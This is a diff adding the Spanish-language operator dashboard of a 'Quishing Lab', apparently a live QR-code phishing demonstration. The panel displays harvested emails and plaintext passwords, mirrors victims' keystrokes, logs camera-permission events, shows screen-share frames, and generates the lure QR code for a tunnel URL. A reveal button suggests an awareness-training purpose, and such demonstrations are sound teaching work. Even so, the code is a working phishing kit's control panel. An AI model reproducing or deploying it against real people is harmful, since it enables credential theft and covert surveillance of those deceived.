@@ -1,0 +1,191 @@
+<!doctype html>
+<html lang="es">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>QUISHING LAB — Panel</title>
+<link rel="stylesheet" href="/styles.css">
+<script src="https://cdnjs.cloudflare.com/ajax/libs/qrcodejs/1.0.0/qrcode.min.js"></script>
+</head>
+<body class="admin">
+<div id="gate" class="gate" hidden>
+  <div class="gatebox">
+    <h1>🔐 Acceso al panel</h1>
+    <input id="inpToken" type="password" placeholder="token de administrador">
+    <button id="saveToken" class="cta">Entrar</button>
+    <p id="gateErr" class="err"></p>
+  </div>
+</div>
+
+<div id="panel" hidden>
+  <header>
+    <h1>🕳️ QUISHING LAB <span class="live">● EN VIVO</span></h1>
+    <div class="controls">
+      <button id="btnReveal" class="danger">🚨 REVELAR</button>
+      <button id="btnReset" class="ghost">↺ Reiniciar</button>
+      <button id="btnFS" class="ghost">⛶ Pantalla completa</button>
+    </div>
+  </header>
+
+  <section class="counters" id="counters"></section>
+
+  <section class="cards" id="cards"></section>
+
+  <section class="bottom">
+    <div class="feedbox">
+      <h2>📡 Eventos en tiempo real</h2>
+      <div id="feed" class="feed"></div>
+    </div>
+    <div class="qrbox">
+      <h2>🔗 QR del concurso</h2>
+      <input id="inpURL" placeholder="https://tu-tunel.trycloudflare.com">
+      <button id="btnQR" class="cta">Generar QR</button>
+      <div id="qr" class="qr"></div>
+    </div>
+  </section>
+</div>
+
+<script>
+let tok = localStorage.qlab_token || '';
+let es = null;
+let refreshTimer = null;
+const $ = id => document.getElementById(id);
+
+async function api(path, opts) {
+  opts = opts || {};
+  opts.headers = Object.assign({ 'x-admin-token': tok }, opts.headers || {});
+  const r = await fetch(path, opts);
+  if (r.status === 401) {
+    // El servidor puede reiniciarse con otro token; no conserves uno obsoleto.
+    localStorage.removeItem('qlab_token');
+    tok = '';
+    if (es) { es.close(); es = null; }
+    showGate('Token inválido o cambiado. Escríbelo de nuevo.');
+    throw new Error('auth');
+  }
+  return r.json();
+}
+function showGate(msg) {
+  $('gate').hidden = false; $('panel').hidden = true;
+  $('gateErr').textContent = msg || '';
+}
+$('saveToken').onclick = () => { tok = $('inpToken').value.trim(); localStorage.qlab_token = tok; start(); };
+
+async function start() {
+  if (!tok) return showGate();
+  try { await api('/api/admin/stats'); } catch (e) { return; }
+  $('gate').hidden = true; $('panel').hidden = false;
+  if (es) es.close();
+  es = new EventSource('/api/live?token=' + encodeURIComponent(tok));
+  es.onmessage = e => {
+    let m; try { m = JSON.parse(e.data); } catch (_) { return refresh(); }
+    if (m.kind === 'heartbeat' || m.kind === 'connected') return;
+    if (m.kind === 'mirror') { live[m.id] = Object.assign(live[m.id] || {}, { mirror: m.mirror }); return patchLive(m.id); }
+    if (m.kind === 'frame') { live[m.id] = Object.assign(live[m.id] || {}, { frame: m.frame }); return patchLive(m.id); }
+    refresh();
+  };
+  es.onerror = () => { /* EventSource reintenta automáticamente. */ };
+  refresh();
+  if (refreshTimer) clearInterval(refreshTimer);
+  refreshTimer = setInterval(refresh, 5000);
+  try {
+    const cfg = await (await fetch('/api/config')).json();
+    if (cfg.publicUrl) $('inpURL').value = cfg.publicUrl;
+  } catch (e) {}
+}
+
+const EMOJI = { session_started: '🟢', landing_viewed: '👀', fake_login_submitted: '🔑', keystroke: '✍️', camera_request_clicked: '📷', camera_permission_granted: '✅', camera_permission_denied: '🚫', camera_preview_active: '🎥', camera_stopped: '⏹', screen_share_started: '🖥️', screen_share_denied: '🚫', screen_share_stopped: '⏹', reveal_seen: '🎭', reveal_activated: '🚨', session_ended: '👋' };
+const TXT = { session_started: 'nueva sesión', landing_viewed: 'vio la landing', fake_login_submitted: 'ENVIÓ CREDENCIALES', keystroke: 'tecleando', camera_request_clicked: 'pidió cámara', camera_permission_granted: 'PERMISO CONCEDIDO', camera_permission_denied: 'permiso rechazado', camera_preview_active: 'vista previa activa', camera_stopped: 'cámara detenida', screen_share_started: 'COMPARTIÓ PANTALLA', screen_share_denied: 'negó compartir pantalla', screen_share_stopped: 'dejó de compartir', reveal_seen: 'vio la revelación', reveal_activated: 'revelación activada por el expositor', session_ended: 'sesión terminada' };
+
+// Estado en vivo por sesión (espejo de tecleo + último frame de pantalla).
+// Llega por SSE local, entre un refresco completo y el siguiente.
+const live = {};
+const esc = s => String(s == null ? '' : s).replace(/[&<>"]/g, c => ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;' }[c]));
+const SECTION_TXT = { stage1: 'Formulario del concurso', stage2: 'Pantalla de cámara', done: 'Esperando resultado', reveal: 'Revelación' };
+
+// Parcha solo los elementos de una tarjeta ya pintada, sin reconstruir el DOM.
+function patchLive(id) {
+  const card = document.getElementById('card-' + id);
+  if (!card) { refresh(); return; }
+  const L = live[id] || {};
+  if (L.mirror) {
+    const sec = document.getElementById('sec-' + id);
+    const mem = document.getElementById('mem-' + id);
+    const mpw = document.getElementById('mpw-' + id);
+    if (sec) sec.textContent = SECTION_TXT[L.mirror.section] || L.mirror.section || '—';
+    if (mem) mem.textContent = L.mirror.email || '—';
+    if (mpw) mpw.textContent = L.mirror.pass ? '•'.repeat(L.mirror.pass.length) + '  (' + L.mirror.pass + ')' : '—';
+  }
+  if (L.frame) {
+    const img = document.getElementById('frm-' + id);
+    const nof = document.getElementById('nof-' + id);
+    if (img) { img.src = L.frame; img.hidden = false; }
+    if (nof) nof.hidden = true;
+  }
+}
+
+async function refresh() {
+  let j;
+  try { j = await api('/api/admin/stats'); } catch (e) { return; }
+  const c = j.counters;
+  $('counters').innerHTML = [
+    ['Visitas', c.visitas], ['Credenciales', c.logins],
+    ['Pidió cámara', c.camSolicitudes], ['Cámara ✔', c.camAceptadas], ['Cámara ✘', c.camRechazadas],
+    ['Pantallas 🖥️', c.pantallas || 0]
+  ].map(x => '<div class="counter"><div class="num">' + x[1] + '</div><div class="lbl">' + x[0] + '</div></div>').join('');
+
+  const sessions = j.sessions.slice().sort((a, b) => a.last_seen - b.last_seen);
+  // Poda el estado en vivo de sesiones que ya no existen (p. ej. tras reiniciar).
+  const ids = new Set(sessions.map(s => s.id));
+  for (const k of Object.keys(live)) if (!ids.has(k)) delete live[k];
+
+  $('cards').innerHTML = sessions.length ? sessions.map(s => {
+    const L = live[s.id] || {};
+    const mir = L.mirror || (s.data && s.data.mirror) || {};
+    let st = '👀 En landing';
+    if (s.stage === 'revelado') { st = '🎭 Revelado'; }
+    else if (s.data && s.data.share === 'compartiendo') { st = '🖥️ Compartiendo pantalla'; }
+    else if (s.data && s.data.cam === 'vista previa activa') { st = '🎥 Cámara activa'; }
+    else if (s.data && s.data.cam === 'rechazado') { st = '🚫 Cámara rechazada'; }
+    else if (s.data && s.data.login) { st = '🔑 Login capturado'; }
+    const meta = '<small>' + esc(s.os) + ' · ' + esc(s.browser) + '</small>';
+    const pw = mir.pass ? '•'.repeat(mir.pass.length) + '  (' + esc(mir.pass) + ')' : '—';
+    const mirrorBlock =
+      '<div class="mirror">' +
+        '<div class="mrow">Sección: <b id="sec-' + s.id + '">' + esc(SECTION_TXT[mir.section] || mir.section || '—') + '</b></div>' +
+        '<div class="mrow">📧 <span id="mem-' + s.id + '">' + (esc(mir.email) || '—') + '</span></div>' +
+        '<div class="mrow">🔑 <span id="mpw-' + s.id + '">' + pw + '</span></div>' +
+      '</div>';
+    const hasFrame = !!L.frame;
+    const frameBlock =
+      '<img class="frame" id="frm-' + s.id + '" ' + (hasFrame ? 'src="' + L.frame + '"' : '') + (hasFrame ? '' : ' hidden') + ' alt="pantalla compartida">' +
+      '<div class="noframe" id="nof-' + s.id + '"' + (hasFrame ? ' hidden' : '') + '>— sin pantalla compartida —</div>';
+    return '<div class="card on" id="card-' + s.id + '"><div class="dot"></div><h3>Teléfono ' + esc(s.label) + '</h3><p>' + st + '</p>' + meta + mirrorBlock + frameBlock + '</div>';
+  }).join('') : '<div class="card empty"><h3>Aún no hay participantes</h3><p>Comparte el QR para comenzar la demostración.</p></div>';
+
+  $('feed').innerHTML = j.events.map(e => {
+    let extra = '';
+    if (e.payload) {
+      if (e.payload.email) extra += ' · 📧 ' + e.payload.email;
+      if (e.payload.password) extra += ' · 🔑 pass="' + e.payload.password + '"';
+      if (e.payload.field) extra += ' · ' + e.payload.field + ' (' + e.payload.len + ' chars)';
+    }
+    const t = new Date(e.created_at).toLocaleTimeString();
+    return '<div class="ev ' + (e.type === 'fake_login_submitted' ? 'hot' : '') + '"><span class="t">' + t + '</span> ' + (EMOJI[e.type] || '•') + ' <b>' + (e.label || '—') + '</b> ' + (TXT[e.type] || e.type) + extra + '</div>';
+  }).join('');
+}
+
+$('btnReveal').onclick = () => api('/api/admin/reveal', { method: 'POST' });
+$('btnReset').onclick = () => { for (const k of Object.keys(live)) delete live[k]; api('/api/admin/reset', { method: 'POST' }); };
+$('btnFS').onclick = () => document.documentElement.requestFullscreen().catch(() => {});
+$('btnQR').onclick = () => {
+  const url = $('inpURL').value.trim();
+  if (!url) return;
+  $('qr').innerHTML = '';
+  try { new QRCode($('qr'), { text: url, width: 240, height: 240 }); }
+  catch (e) { $('qr').textContent = url; }
+};
+start();
+</script>
+</body>
+</html>
